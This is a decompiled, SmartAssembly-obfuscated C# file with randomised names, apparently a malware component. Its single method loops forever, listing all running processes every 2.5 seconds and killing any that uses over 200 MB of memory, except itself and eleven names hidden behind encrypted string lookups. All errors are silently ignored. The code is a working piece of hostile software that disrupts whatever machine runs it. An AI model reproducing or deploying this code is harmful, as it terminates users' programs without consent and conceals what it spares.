using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

public static class oXlRYGxGxCP
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void tvHbTYLzFENrYuEOt()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401618)) && !process.ProcessName.Contains(getString_0(107401577)) && !process.ProcessName.Contains(getString_0(107401600)) && !process.ProcessName.Contains(getString_0(107401591)) && !process.ProcessName.Contains(getString_0(107401546)) && !process.ProcessName.Contains(getString_0(107401565)) && !process.ProcessName.Contains(getString_0(107401520)) && !process.ProcessName.Contains(getString_0(107401507)) && !process.ProcessName.Contains(getString_0(107401526)) && !process.ProcessName.Contains(getString_0(107401481)) && !process.ProcessName.Contains(getString_0(107401492)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static oXlRYGxGxCP()
	{
		Strings.CreateGetStringDelegate(typeof(oXlRYGxGxCP));
	}
}
